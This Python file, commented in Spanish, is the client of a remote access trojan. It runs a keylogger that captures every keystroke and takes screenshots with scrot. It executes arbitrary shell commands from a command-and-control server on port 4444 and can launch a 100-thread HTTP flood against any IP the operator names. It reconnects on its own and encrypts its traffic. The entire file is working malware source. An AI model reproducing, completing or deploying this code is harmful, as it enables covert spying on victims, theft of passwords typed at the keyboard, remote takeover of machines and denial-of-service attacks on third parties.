#!/usr/bin/env python3
# cliente.py - RAT con Keylogger y DDoS integrado 
import socket, subprocess, platform, os, base64, io, time, threading
from cripto import cifrar, descifrar

C2_HOST = "0.0.0.0"  # IP de Kali
C2_PORT = 4444

# --- VARIABLES GLOBALES ---
atacando = False
teclas_buffer = []
teclas_lock = threading.Lock()

# --- MÓDULO KEYLOGGER ---
def iniciar_keylogger():
    try:
        from pynput import keyboard
        def on_press(key):
            try:
                with teclas_lock: teclas_buffer.append(key.char)
            except AttributeError:
                with teclas_lock: teclas_buffer.append(f"[{key.name}]")
        listener = keyboard.Listener(on_press=on_press)
        listener.daemon = True
        listener.start()
    except Exception as e:
        print(f"Error keylogger: {e}")

def volcar_teclas():
    with teclas_lock:
        texto = "".join(teclas_buffer)
        teclas_buffer.clear()
    return texto or "(vacío)"

# --- MÓDULO DDOS ---
def ejecutar_ddos(ip, puerto):
    global atacando
    atacando = True
    def flood():
        while atacando:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((ip, int(puerto)))
                s.send(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
                s.close()
            except: pass
    for _ in range(100):
        t = threading.Thread(target=flood)
        t.daemon = True
        t.start()
    return f"ATAQUE INICIADO contra {ip}:{puerto}"

def detener_ddos():
    global atacando
    atacando = False
    return "ATAQUE DETENIDO."

# --- OTROS MÓDULOS ---
def capturar_pantalla():
    try:
        # Usamos scrot, que es el estándar en Linux y no falla en Wayland
        subprocess.run(["scrot", "/tmp/_shot.png"], check=True)
        with open("/tmp/_shot.png", "rb") as f:
            return base64.b64encode(f.read()).decode()
    except Exception as e:
        return f"ERROR_SCREENSHOT: {e}"

def shell(cmd):
    try: 
        # Ejecución nativa para Linux (sin cmd /c)
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
        return out.decode(errors="ignore")
    except subprocess.CalledProcessError as e: 
        return e.output.decode(errors="ignore")
    except Exception as e: 
        return str(e)

# --- CONEXIÓN ---
def conectar():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((C2_HOST, C2_PORT))
            return s
        except: time.sleep(5)

def main():
    iniciar_keylogger() # Arranca el keylogger al inicio
    s = conectar()
    s.sendall(cifrar(platform.node()))
    buffer = b""
    
    while True:
        try:
            data = s.recv(8192)
            if not data: raise ConnectionError()
            buffer += data
            while b"\n" in buffer:
                linea, buffer = buffer.split(b"\n", 1)
                if not linea.strip(): continue
                comando = descifrar(linea).strip()
                
                if comando == "SYSINFO":
                    s.sendall(cifrar(f"host={platform.node()} | os={platform.system()}"))
                elif comando == "SCREENSHOT":
                    s.sendall(cifrar("SCREENSHOT_B64:" + capturar_pantalla()))
                elif comando == "KEYS":
                    s.sendall(cifrar("KEYS:\n" + volcar_teclas()))
                elif comando.startswith("SHELL "):
                    s.sendall(cifrar("SHELL_OUT:\n" + shell(comando[6:])))
                elif comando.startswith("DDOS "):
                    _, ip, puerto = comando.split(" ")
                    s.sendall(cifrar(ejecutar_ddos(ip, puerto)))
                elif comando == "STOP_DDOS":
                    s.sendall(cifrar(detener_ddos()))
        except:
            s.close()
            time.sleep(5)
            s = conectar()
            s.sendall(cifrar(platform.node()))

if __name__ == "__main__":
    main()
